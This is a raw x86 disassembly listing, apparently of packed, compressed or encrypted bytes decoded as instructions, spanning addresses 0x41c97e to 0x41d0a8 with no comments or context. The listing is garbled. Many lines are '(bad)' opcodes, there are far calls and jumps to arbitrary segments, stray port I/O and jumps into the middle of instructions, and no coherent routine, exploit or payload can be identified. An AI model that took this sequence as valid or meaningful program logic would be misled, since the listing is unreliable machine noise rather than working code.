  41c97e:	xor    dh,BYTE PTR [ecx+ebp*2+0x7f]
  41c982:	popa   
  41c983:	imul   ebx,DWORD PTR [edx-0x47],0x13c385f7
  41c98a:	push   esi
  41c98b:	enter  0x90d2,0x4b
  41c98f:	jl     0x41c9ff
  41c991:	dec    edi
  41c992:	(bad)  
  41c994:	scas   eax,DWORD PTR es:[edi]
  41c995:	fnstenv [esi+0x58b1fa18]
  41c99b:	add    eax,0xcfde36ae
  41c9a0:	cld    
  41c9a1:	fstp   QWORD PTR [eax+0x74]
  41c9a4:	dec    edx
  41c9a5:	fistp  WORD PTR ds:0x5bc5c70f
  41c9ab:	jg     0x41c966
  41c9ad:	cmp    edi,DWORD PTR [edi+0x16]
  41c9b0:	adc    ecx,DWORD PTR [eax+0x26]
  41c9b3:	nop
  41c9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b5:	call   0x980b:0xb6d6c7e7
  41c9bc:	pusha  
  41c9bd:	dec    esp
  41c9be:	lock sbb eax,0x99965573
  41c9c4:	cdq    
  41c9c5:	and    esp,ecx
  41c9c7:	popf   
  41c9c8:	or     BYTE PTR [ecx-0x60],0x4f
  41c9cc:	mov    ah,0xd1
  41c9ce:	adc    al,0x32
  41c9d0:	add    bl,BYTE PTR [ecx+0x1c680b01]
  41c9d6:	adc    eax,0xed16ed59
  41c9db:	rol    BYTE PTR [edi-0x68],1
  41c9de:	xchg   BYTE PTR [eax-0x3abf5d8b],bh
  41c9e4:	mov    edx,0xc0f14707
  41c9e9:	mov    eax,0x32b2c49c
  41c9ee:	xchg   esi,eax
  41c9ef:	lds    edx,FWORD PTR [ebx]
  41c9f1:	fidivr DWORD PTR [esi+0x5d234225]
  41c9f7:	neg    cl
  41c9f9:	push   eax
  41c9fa:	jne    0x41c9a3
  41c9fc:	mov    al,0x1f
  41c9fe:	inc    esp
  41c9ff:	shr    BYTE PTR [ebx+0x5b],1
  41ca02:	data16 mov ah,0x2c
  41ca05:	mov    ch,0xde
  41ca07:	(bad)  
  41ca08:	jp     0x41c9f0
  41ca0a:	inc    edx
  41ca0b:	(bad)  
  41ca0c:	push   ebp
  41ca0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca0e:	mov    ds:0xe27618be,al
  41ca13:	inc    ebx
  41ca14:	sub    al,0x1d
  41ca16:	div    BYTE PTR [esi]
  41ca18:	scas   eax,DWORD PTR es:[edi]
  41ca19:	pop    esi
  41ca1a:	xchg   edx,eax
  41ca1b:	mov    WORD PTR ds:0x3b13266d,es
  41ca21:	faddp  st(3),st
  41ca23:	lds    esp,FWORD PTR [ecx]
  41ca25:	iret   
  41ca26:	and    BYTE PTR [ebp+eiz*1-0x6b13925e],dl
  41ca2d:	xchg   esp,eax
  41ca2e:	call   0x5e821157
  41ca33:	test   eax,0x4392f26a
  41ca38:	sub    DWORD PTR [edx],edx
  41ca3a:	push   ss
  41ca3b:	inc    edi
  41ca3c:	mov    ds:0xc04a1d5e,eax
  41ca41:	cmp    esi,DWORD PTR [ecx-0x22]
  41ca44:	sub    ch,BYTE PTR [eax]
  41ca46:	xor    eax,0xb14cf264
  41ca4b:	xchg   al,dh
  41ca4d:	sub    DWORD PTR [eax+0x15044a27],ebp
  41ca53:	ss push 0x117ac3ac
  41ca59:	lods   eax,DWORD PTR ds:[esi]
  41ca5a:	mul    DWORD PTR [ebx]
  41ca5c:	retf   0x3bc9
  41ca5f:	and    al,0xef
  41ca61:	jmp    0x41ca80
  41ca63:	fadd   st(7),st
  41ca65:	clc    
  41ca66:	dec    ecx
  41ca67:	sub    DWORD PTR [eax],ebp
  41ca69:	out    0x7a,al
  41ca6b:	repz dec eax
  41ca6d:	js     0x41ca98
  41ca6f:	das    
  41ca70:	test   eax,0xa2a3dddd
  41ca75:	fistp  WORD PTR [edx]
  41ca77:	inc    esp
  41ca78:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41ca7a:	jp     0x41ca51
  41ca7c:	data16 cmc 
  41ca7e:	aas    
  41ca7f:	cmp    ch,0xf9
  41ca82:	or     BYTE PTR [edx+0x29dee7b3],ch
  41ca88:	jne    0x41ca97
  41ca8a:	pop    edx
  41ca8b:	xchg   ebp,eax
  41ca8c:	push   ecx
  41ca8d:	sub    esp,DWORD PTR [ebp-0x73]
  41ca90:	mov    ebx,0xb42caa10
  41ca95:	sbb    DWORD PTR [ebp+0x34],edx
  41ca98:	(bad)  [edx]
  41ca9a:	repnz imul ecx,DWORD PTR [ebx+0xd7b541e],0x6f
  41caa2:	jns    0x41ca9b
  41caa4:	mov    ebx,0xbd095878
  41caa9:	stos   BYTE PTR es:[edi],al
  41caaa:	je     0x41caf6
  41caac:	into   
  41caad:	loope  0x41cabd
  41caaf:	jge    0x41ca76
  41cab1:	xor    ah,BYTE PTR [ebp+0x4b]
  41cab4:	jb     0x41cb1b
  41cab6:	xchg   ebx,eax
  41cab7:	pop    ebp
  41cab8:	or     DWORD PTR [edi-0x4868df3d],eax
  41cabe:	inc    edi
  41cabf:	jb     0x41ca52
  41cac1:	fwait
  41cac2:	aas    
  41cac3:	mov    dl,0xac
  41cac5:	jae    0x41cafe
  41cac7:	jle    0x41cac1
  41cac9:	nop
  41caca:	(bad)  
  41cacb:	(bad)  
  41cacc:	call   FWORD PTR [ebx+0x76f71007]
  41cad2:	vcvtsd2ss xmm1,xmm2,QWORD PTR [eax]
  41cad7:	inc    ecx
  41cad8:	(bad)  
  41cad9:	in     al,dx
  41cada:	ror    BYTE PTR ss:[edx+0x25],0x32
  41cadf:	mov    esi,0x9a7eb5b4
  41cae4:	imul   ebp,DWORD PTR [ebx],0x4b
  41cae7:	sub    DWORD PTR [ebp-0x152a86a],edi
  41caed:	pop    ds
  41caee:	inc    esi
  41caef:	sti    
  41caf0:	clc    
  41caf1:	stc    
  41caf2:	inc    edx
  41caf3:	test   DWORD PTR [esi+0x276c0e5a],eax
  41caf9:	jns    0x41cae9
  41cafb:	jmp    0x5e32:0xf7249d8d
  41cb02:	outs   dx,DWORD PTR ds:[esi]
  41cb03:	mov    bh,0x6d
  41cb05:	jp     0x41cb3e
  41cb07:	nop
  41cb08:	das    
  41cb09:	mov    ch,BYTE PTR [edx-0x46330922]
  41cb0f:	das    
  41cb10:	in     eax,0xa0
  41cb12:	dec    edx
  41cb13:	dec    ebp
  41cb14:	test   BYTE PTR [edx-0x7a6abf7f],ah
  41cb1a:	dec    esi
  41cb1b:	mov    bh,0xd7
  41cb1d:	ja     0x41cad8
  41cb1f:	ss push 0x21c0e789
  41cb25:	or     esp,0xffffffa8
  41cb28:	stc    
  41cb29:	fadd   DWORD PTR [eax]
  41cb2b:	pop    esi
  41cb2c:	leave  
  41cb2d:	jge    0x41cb73
  41cb2f:	mov    eax,ds:0x2571c552
  41cb34:	jo     0x41cb6a
  41cb36:	es pop esi
  41cb38:	mov    eax,0xc6f0c453
  41cb3d:	popa   
  41cb3e:	mov    ds:0x4a341601,eax
  41cb43:	rcr    BYTE PTR [edx-0x4b5d368],1
  41cb49:	dec    esi
  41cb4a:	neg    DWORD PTR [esi+0x349f9993]
  41cb50:	push   edi
  41cb51:	retf   0x511d
  41cb54:	je     0x41caeb
  41cb56:	lock sub cl,BYTE PTR [esi]
  41cb59:	jno    0x41cb8d
  41cb5b:	int    0xd8
  41cb5d:	jge    0x41cb83
  41cb5f:	inc    ebp
  41cb60:	(bad)  
  41cb61:	lods   al,BYTE PTR ds:[esi]
  41cb62:	test   al,0x25
  41cb64:	pop    ecx
  41cb65:	sub    eax,0x277208d8
  41cb6a:	add    eax,0x5bbe05a9
  41cb6f:	lea    ebx,[edi]
  41cb71:	je     0x41cb26
  41cb73:	jle    0x41cb58
  41cb75:	mov    gs,esp
  41cb77:	dec    edi
  41cb78:	loope  0x41cb0f
  41cb7a:	or     al,0x52
  41cb7c:	inc    esp
  41cb7d:	sbb    ah,cl
  41cb7f:	stos   DWORD PTR es:[edi],eax
  41cb80:	dec    ebp
  41cb81:	jp     0x41cbc5
  41cb83:	jecxz  0x41cb62
  41cb85:	inc    edi
  41cb86:	daa    
  41cb87:	ret    
  41cb88:	push   ebp
  41cb89:	mov    ds:0x90e28a8c,al
  41cb8e:	mov    esi,0xd33128bc
  41cb93:	xor    eax,0x8e93950b
  41cb98:	adc    eax,0xd0fc1777
  41cb9d:	pop    ecx
  41cb9e:	push   ebp
  41cb9f:	push   edi
  41cba0:	sti    
  41cba1:	pusha  
  41cba2:	sahf   
  41cba3:	fimul  DWORD PTR [eax]
  41cba5:	ror    edi,1
  41cba7:	jns    0x41cb5c
  41cba9:	inc    esp
  41cbaa:	mov    ecx,0xd7ef04d1
  41cbaf:	cmp    al,0x77
  41cbb1:	dec    esi
  41cbb2:	ret    0xba1
  41cbb5:	retf   0xa7fe
  41cbb8:	nop
  41cbb9:	and    bl,al
  41cbbb:	sti    
  41cbbc:	jb     0x41cc2f
  41cbbe:	lds    esi,FWORD PTR [ebx]
  41cbc0:	stc    
  41cbc1:	or     ebx,DWORD PTR [ebp-0x282199f0]
  41cbc7:	inc    ebx
  41cbc8:	xchg   ebx,eax
  41cbc9:	pop    esp
  41cbca:	mov    dh,0xa4
  41cbcc:	jno    0x41cbee
  41cbce:	in     eax,0xec
  41cbd0:	sbb    BYTE PTR [edx+0x6d],ch
  41cbd3:	ret    
  41cbd4:	sahf   
  41cbd5:	jge    0x41cbb2
  41cbd7:	mov    edx,0x7c1a52d7
  41cbdc:	repz inc eax
  41cbde:	push   edx
  41cbdf:	sbb    BYTE PTR [edx+edi*4+0x6d],ch
  41cbe3:	mov    ah,BYTE PTR [eax+0x4d]
  41cbe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbe7:	pop    ebx
  41cbe8:	cmp    ebx,esi
  41cbea:	mov    ebx,DWORD PTR [ecx]
  41cbec:	or     al,0xa8
  41cbee:	jle    0x41cc53
  41cbf0:	xor    DWORD PTR [ebx-0x7cc012ff],ebp
  41cbf6:	sbb    al,0x1e
  41cbf9:	cmp    al,0x55
  41cbfb:	jns    0x41cbe2
  41cbfd:	fwait
  41cbfe:	mov    edx,0x16d37f22
  41cc03:	mov    dl,0x6d
  41cc05:	lods   al,BYTE PTR ds:[esi]
  41cc06:	sti    
  41cc07:	or     eax,0x4477f8f7
  41cc0c:	mov    esp,0xaf8a679e
  41cc11:	test   al,0xea
  41cc13:	inc    edi
  41cc14:	aam    0xc
  41cc16:	jae    0x41cbf2
  41cc18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc19:	dec    esp
  41cc1a:	cld    
  41cc1b:	inc    esi
  41cc1c:	mov    ch,0xb8
  41cc1e:	mov    ecx,0x212754f5
  41cc23:	pop    ebp
  41cc24:	pop    es
  41cc25:	jbe    0x41cba8
  41cc27:	jecxz  0x41cc2d
  41cc29:	dec    esi
  41cc2a:	xor    bh,BYTE PTR [esi+eax*1+0x34f228ff]
  41cc31:	sbb    BYTE PTR [ebp+0xaba15ed],0xcd
  41cc38:	pop    ds
  41cc39:	inc    edi
  41cc3a:	frstor [ecx+0x46]
  41cc3d:	push   ecx
  41cc3e:	dec    esi
  41cc3f:	xchg   edx,eax
  41cc40:	cmp    dh,dh
  41cc42:	daa    
  41cc43:	push   ss
  41cc44:	or     BYTE PTR [esp+edi*4-0x52],0x90
  41cc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc4a:	cs in  eax,0x51
  41cc4d:	inc    ebx
  41cc4e:	lods   al,BYTE PTR ds:[esi]
  41cc4f:	pop    ss
  41cc50:	shr    DWORD PTR [esi+0x1e],0xd5
  41cc54:	lahf   
  41cc55:	cmp    edi,DWORD PTR [esi+0x70571cf1]
  41cc5b:	xor    DWORD PTR [ecx],esp
  41cc5d:	xlat   BYTE PTR ds:[ebx]
  41cc5e:	mov    BYTE PTR [eax],cl
  41cc60:	adc    al,0xd1
  41cc62:	cmp    DWORD PTR [edi-0x64915b29],eax
  41cc68:	jge    0x41cc5d
  41cc6a:	mov    WORD PTR [ebx],cs
  41cc6c:	mov    WORD PTR cs:[ebx+ebx*8-0x9],es
  41cc71:	push   cs
  41cc72:	push   cs
  41cc73:	pop    esi
  41cc74:	xor    eax,0xc8b058c8
  41cc79:	sar    esi,cl
  41cc7b:	and    ch,BYTE PTR [esi+ecx*1-0x2c]
  41cc7f:	mov    ecx,0x9da43bf4
  41cc84:	push   esi
  41cc85:	or     DWORD PTR [esi-0x37],0xf1654057
  41cc8c:	int3   
  41cc8d:	outs   dx,DWORD PTR ds:[esi]
  41cc8e:	add    DWORD PTR [edx-0x65],0xffffff9d
  41cc92:	test   eax,0xe23b8ce1
  41cc97:	cdq    
  41cc98:	sbb    DWORD PTR [esi],ecx
  41cc9a:	cmp    al,BYTE PTR [edx+0x64]
  41cc9d:	int    0xa0
  41cc9f:	bound  esi,QWORD PTR [ebp-0x6fed7e1d]
  41cca5:	dec    esi
  41cca6:	inc    edx
  41cca7:	imul   eax,DWORD PTR [edx-0x36],0x26
  41ccab:	lock jb 0x41cc4f
  41ccae:	jecxz  0x41cd13
  41ccb0:	mov    edx,edi
  41ccb2:	cld    
  41ccb3:	sub    edx,DWORD PTR [esp+edx*8+0x2f]
  41ccb7:	cmp    BYTE PTR [ecx-0x46],dh
  41ccba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccbb:	add    al,dl
  41ccbd:	and    al,0x37
  41ccbf:	jae    0x41cce8
  41ccc1:	jmp    0x2553725b
  41ccc6:	sub    eax,0x6cae408e
  41cccb:	jecxz  0x41cc72
  41cccd:	jo     0x41ccdc
  41cccf:	js     0x41cd0e
  41ccd1:	pop    ebx
  41ccd2:	mov    ds:0x2cad6040,al
  41ccd7:	in     al,dx
  41ccd8:	xchg   edx,eax
  41ccd9:	push   ebx
  41ccda:	jbe    0x41cd13
  41ccdc:	jbe    0x41ccb0
  41ccde:	sub    al,0xea
  41cce0:	popf   
  41cce1:	inc    edi
  41cce2:	aas    
  41cce3:	or     eax,0x24a767cc
  41cce8:	rol    BYTE PTR ds:0x6274b4a6,0xff
  41ccef:	mov    ecx,0xbc261ae1
  41ccf4:	in     eax,0xa6
  41ccf6:	dec    ecx
  41ccf7:	xchg   DWORD PTR [ecx+0x7d],eax
  41ccfa:	stos   BYTE PTR es:[edi],al
  41ccfb:	ss jl  0x41ccbb
  41ccfe:	jns    0x41cd6a
  41cd00:	test   eax,0xc8af49c6
  41cd05:	sahf   
  41cd06:	enter  0xf2f8,0x80
  41cd0a:	call   0xe518:0x65973a5e
  41cd11:	psrld  mm0,mm7
  41cd14:	pushf  
  41cd15:	ror    bl,cl
  41cd17:	sub    al,0x39
  41cd1a:	sub    DWORD PTR [ecx-0x51],esp
  41cd1d:	jbe    0x41ccfd
  41cd1f:	shr    BYTE PTR [ebp-0x41],0x70
  41cd23:	std    
  41cd24:	in     al,0x54
  41cd26:	(bad)  
  41cd27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd28:	jle    0x41cd7a
  41cd2a:	xlat   BYTE PTR ds:[ebx]
  41cd2b:	addr16 mov ebx,0x10e40d5f
  41cd31:	(bad)  
  41cd32:	pminsw mm5,QWORD PTR [ebx-0x63]
  41cd36:	ficom  WORD PTR [edi+0x6e469b4f]
  41cd3c:	bound  esp,QWORD PTR [ecx]
  41cd3e:	call   0xa8409708
  41cd43:	loopne 0x41cd93
  41cd45:	push   eax
  41cd46:	cmp    DWORD PTR [ecx+0x75f1f597],0x30
  41cd4d:	es push 0xffffff82
  41cd50:	mov    ah,0x2f
  41cd52:	dec    ebp
  41cd53:	mov    edx,0xfb52bc88
  41cd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd59:	es daa 
  41cd5b:	rol    BYTE PTR [edi],cl
  41cd5d:	ins    DWORD PTR es:[edi],dx
  41cd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd5f:	jge    0x41cd4c
  41cd61:	mov    bl,0xfb
  41cd63:	out    dx,eax
  41cd64:	ja     0x41cdd2
  41cd66:	jno    0x41ccf0
  41cd68:	std    
  41cd69:	mov    edx,0xf18bcb5f
  41cd6e:	mov    bh,0x2b
  41cd70:	cmp    eax,0x273d3bf5
  41cd75:	cmc    
  41cd76:	add    eax,0x2fd69a3d
  41cd7b:	inc    esi
  41cd7c:	sti    
  41cd7d:	mov    ds:0xbd8cedb0,al
  41cd82:	sahf   
  41cd83:	daa    
  41cd84:	rol    DWORD PTR [eax],0x6a
  41cd87:	frstor [edx+0xd]
  41cd8a:	xchg   BYTE PTR [edi-0x54],al
  41cd8d:	das    
  41cd8e:	fst    QWORD PTR [edx]
  41cd90:	inc    esi
  41cd91:	cs push ecx
  41cd93:	dec    ebx
  41cd94:	cmp    ebp,DWORD PTR [ebp+0x4c]
  41cd97:	push   eax
  41cd98:	arpl   WORD PTR [ebx-0x6b],ax
  41cd9b:	sbb    eax,0x547bcd0b
  41cda0:	out    0x62,eax
  41cda2:	pop    ss
  41cda3:	or     al,BYTE PTR [eax-0x74391941]
  41cda9:	popa   
  41cdaa:	stos   DWORD PTR es:[edi],eax
  41cdab:	jae    0x41ce06
  41cdad:	stos   BYTE PTR es:[edi],al
  41cdae:	call   0xf9ba:0xdfa1b249
  41cdb5:	push   0xffffff9c
  41cdb7:	mov    ds:0x6ab249b3,eax
  41cdbc:	mov    dl,0xff
  41cdbe:	(bad)  
  41cdbf:	daa    
  41cdc0:	push   edi
  41cdc1:	jp     0x41cd94
  41cdc3:	std    
  41cdc4:	aam    0x66
  41cdc6:	sti    
  41cdc7:	sub    BYTE PTR [ecx-0x6c11073f],bl
  41cdcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdce:	dec    ebx
  41cdcf:	xor    edi,DWORD PTR [esi+0xe2ba6f4]
  41cdd5:	pop    edi
  41cdd6:	sbb    DWORD PTR [ebx-0x48],ecx
  41cdd9:	inc    ecx
  41cdda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cddb:	in     eax,0x2e
  41cddd:	out    dx,al
  41cdde:	scas   eax,DWORD PTR es:[edi]
  41cddf:	icebp  
  41cde0:	fiadd  WORD PTR [ebx-0x30]
  41cde3:	into   
  41cde4:	sbb    cl,BYTE PTR [esi-0x23c3a398]
  41cdea:	and    dh,BYTE PTR [edx+0x668e3c2d]
  41cdf0:	inc    ebx
  41cdf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf2:	test   al,0xf7
  41cdf4:	pop    eax
  41cdf5:	jmp    0x7e4df9fa
  41cdfa:	fidiv  WORD PTR [ebp-0x34ad9ba8]
  41ce00:	mov    cs,WORD PTR [edi-0x3b2275e8]
  41ce06:	push   ecx
  41ce07:	in     eax,0x2b
  41ce09:	stos   DWORD PTR es:[edi],eax
  41ce0a:	test   al,0xa8
  41ce0c:	js     0x41cde8
  41ce0e:	mov    ?,WORD PTR [esp+edx*8-0x1f]
  41ce12:	mov    ch,0xc8
  41ce14:	icebp  
  41ce15:	xor    eax,0xcb1171a7
  41ce1a:	(bad)  
  41ce1b:	mov    eax,0x746c6737
  41ce20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce21:	fwait
  41ce22:	mov    edx,0xbae24fa6
  41ce27:	outs   dx,DWORD PTR ds:[esi]
  41ce28:	mov    edx,DWORD PTR [ebp+0x64]
  41ce2b:	dec    eax
  41ce2c:	lds    esi,FWORD PTR [ebx]
  41ce2e:	outs   dx,DWORD PTR ds:[esi]
  41ce30:	inc    ebx
  41ce31:	dec    esp
  41ce32:	sbb    eax,0xaf9305ff
  41ce37:	in     al,0x94
  41ce39:	xchg   edx,eax
  41ce3a:	into   
  41ce3b:	ins    DWORD PTR es:[edi],dx
  41ce3c:	add    bh,bh
  41ce3e:	mov    ecx,DWORD PTR [ebx+0x78]
  41ce41:	mov    bl,0xad
  41ce43:	sbb    al,0x1a
  41ce45:	stc    
  41ce46:	icebp  
  41ce47:	pop    ecx
  41ce48:	adc    dl,BYTE PTR [di+0x3d72]
  41ce4d:	nop
  41ce4e:	pop    ss
  41ce4f:	cmp    bl,BYTE PTR [ebp-0x73bf3de4]
  41ce55:	ret    0xc4da
  41ce58:	inc    eax
  41ce59:	mov    es,WORD PTR [esi-0x36]
  41ce5c:	mov    al,ds:0x7cdfd69c
  41ce61:	and    BYTE PTR [ebp+esi*8-0x3d4aaa7f],bh
  41ce68:	or     al,0x63
  41ce6a:	sbb    al,BYTE PTR [edi+0xbc1ce5]
  41ce70:	ss sbb edi,0x2b5686d2
  41ce77:	int    0x3d
  41ce79:	ja     0x41ce41
  41ce7b:	jp     0x41ceab
  41ce7d:	mov    ebp,0x8ad3b6be
  41ce82:	mov    DWORD PTR ds:0xcecb5991,ebx
  41ce88:	adc    al,0x36
  41ce8a:	push   esi
  41ce8b:	inc    eax
  41ce8c:	dec    BYTE PTR [ebp+0x253c6484]
  41ce92:	stos   BYTE PTR es:[edi],al
  41ce93:	arpl   WORD PTR [eax],dx
  41ce95:	and    edx,ebp
  41ce97:	xchg   ebp,eax
  41ce98:	pop    ebp
  41ce99:	popa   
  41ce9a:	or     ebx,DWORD PTR [ebp-0x16]
  41ce9d:	int    0xa3
  41ce9f:	out    dx,al
  41cea0:	shr    DWORD PTR [edi-0x1a],cl
  41cea3:	xchg   edi,eax
  41cea4:	adc    bl,BYTE PTR [ecx-0x1f]
  41cea7:	rcr    al,1
  41cea9:	add    BYTE PTR [ecx-0x69e69e65],bh
  41ceaf:	mov    dl,0x7b
  41ceb1:	inc    ecx
  41ceb2:	rol    DWORD PTR [edi+0x65cce4fc],0x7a
  41ceb9:	jne    0x41ce54
  41cebb:	mov    esi,edi
  41cebd:	sub    cl,dl
  41cebf:	jecxz  0x41cf30
  41cec1:	fmulp  st(7),st
  41cec3:	lods   eax,DWORD PTR ds:[esi]
  41cec4:	dec    ebp
  41cec5:	mov    al,ds:0xba594da6
  41ceca:	pop    edx
  41cecb:	mov    esp,0xc2ef4dc5
  41ced0:	fucomp st(1)
  41ced2:	cmp    ebp,DWORD PTR [ecx+0x5]
  41ced5:	std    
  41ced6:	inc    edi
  41ced7:	jb     0x41cf0c
  41ced9:	jo     0x41ce7a
  41cedb:	icebp  
  41cedc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cede:	jo     0x41ceb4
  41cee0:	xor    DWORD PTR [esp+edx*4],ecx
  41cee3:	mov    ds:0x8739eb19,eax
  41cee8:	popf   
  41cee9:	push   ds
  41ceea:	jmp    0x5a76:0x91ac5a61
  41cef1:	sbb    BYTE PTR [edx-0x49],ch
  41cef4:	adc    eax,0x6f30b255
  41cef9:	ds popa 
  41cefb:	xchg   ecx,eax
  41cefc:	cmp    ebp,esp
  41cefe:	adc    eax,0x726d02c1
  41cf03:	cs (bad) 
  41cf05:	cmp    ah,BYTE PTR [edi]
  41cf07:	lods   al,BYTE PTR ds:[esi]
  41cf08:	inc    esp
  41cf09:	xor    ebx,DWORD PTR [edi-0x19ae84ab]
  41cf0f:	call   0x93529347
  41cf14:	fiadd  DWORD PTR [eax]
  41cf16:	push   ebx
  41cf17:	sub    esi,DWORD PTR [ebx-0x7054d361]
  41cf1d:	mov    bh,0x6a
  41cf1f:	dec    esi
  41cf20:	mov    ds:0xd9f020e1,eax
  41cf25:	aad    0x93
  41cf27:	enter  0xcd9b,0x67
  41cf2b:	fisubr DWORD PTR [esp+edx*1-0x72]
  41cf2f:	popa   
  41cf30:	jne    0x41cf1c
  41cf32:	ss push ds
  41cf34:	jmp    0x5393:0x2b15e67a
  41cf3b:	in     al,0xeb
  41cf3d:	mov    ah,0x2b
  41cf3f:	dec    edx
  41cf40:	dec    esi
  41cf41:	ficom  DWORD PTR [ebx+0x6a]
  41cf44:	fcomp  st(0)
  41cf46:	cmp    eax,ecx
  41cf48:	adc    eax,0xc916c22b
  41cf4d:	jecxz  0x41cf10
  41cf4f:	(bad)  
  41cf50:	(bad)  
  41cf52:	aad    0x49
  41cf54:	inc    esp
  41cf55:	jmp    ebp
  41cf57:	clc    
  41cf58:	ins    BYTE PTR es:[edi],dx
  41cf59:	jne    0x41cedd
  41cf5b:	xor    DWORD PTR [esp+edi*2-0x52921c62],edi
  41cf62:	aam    0x93
  41cf64:	clc    
  41cf65:	xor    eax,0x7dec3968
  41cf6a:	mov    esp,DWORD PTR [ebp+0x1]
  41cf6d:	leave  
  41cf6e:	sti    
  41cf6f:	pop    ds
  41cf70:	or     al,0xaa
  41cf72:	data16 int3 
  41cf74:	pushf  
  41cf75:	mov    ds:0xd3ba12b3,eax
  41cf7a:	pop    eax
  41cf7b:	and    dl,BYTE PTR [eax-0x29]
  41cf7e:	mov    ds:0x69b81051,al
  41cf83:	cmp    DWORD PTR [edx],edx
  41cf85:	pop    es
  41cf86:	jmp    0x27:0xa8b02369
  41cf8d:	gs bnd jl 0x41cf77
  41cf91:	dec    ebp
  41cf92:	jae    0x41cfa1
  41cf94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf95:	arpl   WORD PTR [ecx-0xa],sp
  41cf98:	mov    ah,0xd0
  41cf9a:	jge    0x41cfa7
  41cf9c:	std    
  41cf9d:	xchg   edi,eax
  41cf9e:	dec    esp
  41cf9f:	mov    dl,0xce
  41cfa1:	js     0x41cfba
  41cfa3:	lods   eax,DWORD PTR ds:[esi]
  41cfa4:	push   esp
  41cfa5:	rcl    DWORD PTR [ebp+0x316759f4],1
  41cfab:	ficom  WORD PTR [eax+0x5156f782]
  41cfb1:	fsin   
  41cfb3:	mov    ss,WORD PTR [eax+0x3]
  41cfb6:	dec    ebx
  41cfb7:	inc    ecx
  41cfb8:	push   esp
  41cfb9:	js     0x41cfe6
  41cfbb:	call   0x32f695f4
  41cfc0:	icebp  
  41cfc1:	inc    ebx
  41cfc2:	shl    DWORD PTR [esp+ebp*1-0x6d33582],1
  41cfc9:	jge    0x41d031
  41cfcb:	pop    eax
  41cfcc:	mov    edx,0x1849a6ba
  41cfd1:	xchg   DWORD PTR [ecx+0x1589bac2],edx
  41cfd7:	sbb    bh,BYTE PTR [edi+0x1cc70c70]
  41cfdd:	jecxz  0x41d036
  41cfdf:	popa   
  41cfe0:	mov    ecx,0x9dbc4e48
  41cfe5:	lahf   
  41cfe6:	inc    edi
  41cfe7:	xchg   esp,eax
  41cfe8:	lods   al,BYTE PTR ds:[esi]
  41cfe9:	xchg   ebp,eax
  41cfea:	add    bl,BYTE PTR [ebx+esi*4+0x3ad48250]
  41cff1:	and    dh,dl
  41cff3:	mov    ebp,0xe9f58130
  41cff8:	mov    ds:0xa42d81d3,al
  41cffd:	frstor [ecx-0x4]
  41d000:	pusha  
  41d001:	int    0x9b
  41d003:	imul   eax,esp,0xa
  41d006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d007:	lahf   
  41d008:	dec    ebp
  41d009:	lea    esi,[edx-0x7]
  41d00c:	test   al,0xa9
  41d00e:	movd   mm5,DWORD PTR [ebx+ebx*1]
  41d012:	cmp    eax,0x9db835ce
  41d017:	out    dx,eax
  41d018:	ret    
  41d019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d01a:	ret    0x9813
  41d01d:	dec    esi
  41d01e:	cmp    eax,0x768f210c
  41d023:	retf   0x525a
  41d026:	loopne 0x41cfc9
  41d028:	cmp    DWORD PTR [ebx],ebx
  41d02a:	es xchg edx,eax
  41d02c:	and    DWORD PTR [edx],edx
  41d02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d02f:	jns    0x41d087
  41d031:	xchg   esi,eax
  41d032:	and    cl,BYTE PTR ds:[ecx]
  41d035:	test   al,0xb1
  41d037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d038:	inc    esi
  41d039:	out    0xc1,al
  41d03b:	ins    DWORD PTR es:[edi],dx
  41d03c:	xchg   ebp,eax
  41d03d:	cmp    DWORD PTR [eax],esi
  41d03f:	xacquire xchg DWORD PTR [esp+eax*4],eax
  41d043:	push   esp
  41d044:	adc    BYTE PTR [ebp-0x29],ch
  41d047:	mov    edx,0x256a66d5
  41d04c:	fbstp  TBYTE PTR [esi-0x73d2031f]
  41d052:	sbb    bl,al
  41d054:	pop    ebp
  41d055:	mov    edi,esi
  41d057:	sub    edx,DWORD PTR [ebx]
  41d059:	popa   
  41d05a:	or     BYTE PTR [ebx],bh
  41d05c:	bound  ecx,QWORD PTR [edi]
  41d05e:	stos   BYTE PTR es:[edi],al
  41d05f:	or     al,0x30
  41d061:	loopne 0x41d08a
  41d063:	cmp    al,0x10
  41d065:	lock push edx
  41d067:	setg   bh
  41d06a:	out    0xcb,eax
  41d06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d06d:	adc    BYTE PTR [esi],0xac
  41d070:	or     cl,BYTE PTR [edi-0x6]
  41d073:	xchg   esi,eax
  41d074:	mov    eax,0xb84a8b4a
  41d079:	push   ebx
  41d07a:	(bad)  
  41d07b:	ror    BYTE PTR [edx+ecx*4-0x6c243409],1
  41d082:	aad    0x88
  41d084:	outs   dx,BYTE PTR ds:[esi]
  41d085:	daa    
  41d086:	cld    
  41d087:	ret    0x74de
  41d08a:	adc    al,0x30
  41d08c:	xchg   ecx,eax
  41d08d:	sub    DWORD PTR [ebx+0x37262cb5],edi
  41d093:	mul    bl
  41d095:	xor    eax,0x3bb943c3
  41d09a:	xchg   edx,eax
  41d09b:	call   0xf61a:0xa89612ad
  41d0a2:	sub    ah,BYTE PTR [esi-0x15a16a63]
  41d0a8:	xor    cl,cl
